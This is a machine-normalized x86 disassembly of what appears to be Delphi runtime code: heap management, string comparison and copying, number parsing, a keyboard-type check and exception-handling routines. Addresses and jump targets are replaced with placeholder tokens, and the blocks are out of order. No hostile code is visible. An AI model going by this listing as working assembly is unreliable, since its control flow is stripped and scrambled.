pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401388
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_40395c
jmp r-xdata
call sub_401eb8
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bc8
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e30
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bc8
sub_402444
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401eb8
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bc8
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fbc
test al al
je r-xdata
call sub_401bc8
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c8c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e30
jmp r-xdata
sub_402620
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026d1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a24
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402444
test al al
je r-xdata
push rw-data
call sub_401380
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402110
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028e0
mov eax ebx
call sub_4022a0
retn
push rw-data
call sub_401388
sub_4026e4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402840
sub_402704
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402840
sub_402724
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402840
mov [ ecx ] eax
mov al 0x2
jmp sub_402840
retn
mov [ ecx ] eax
retn
sub_4027b4
push ebx
push esi
call sub_405cc8
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405cc8
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405cc8
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027f4
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405cc8
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027e8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40287c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028e0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402944
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402984
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40286c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4029d8
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40286c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40286c
jmp r-xdata
sub_402a30
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028e0
pop ebx
retn
mov ecx ebx
sub_402a4c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402ad0
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b40
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b60
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c40
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402c80
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d33 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d33 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f6c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402f9c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012dc
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40300d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012d4
retn
sub_403088
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403130
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403188
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404934
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031a8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4055b0
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4031d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40325c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40326c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403263
lea eax [ ebp - 0x8 ]
call sub_405598
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031a8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4055b0
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40326c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4032b0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403350
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4032f0
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403320
push eax
push ecx
mov eax [ eax ]
call sub_4032f0
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e68
call [ rw-data ]
sub_403338
push esi
mov esi edx
mov eax [ eax ]
call sub_4032f0
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e68
call [ rw-data ]
sub_403380
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4032f0
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033a8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4033f8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403448
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403471
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4034dc
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403518
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40352c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403540
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403560
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403540
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4035c4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403060
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405cc8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_40352c
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4034dc
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4036f0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403060
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4034dc
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405cc8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403518
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402ad0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403878
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403560
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4038b0
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403e68
sub_4038d8
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405cc8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403124
call sub_4034c0
sub_40392c
call sub_405cc8
mov edx [ eax ]
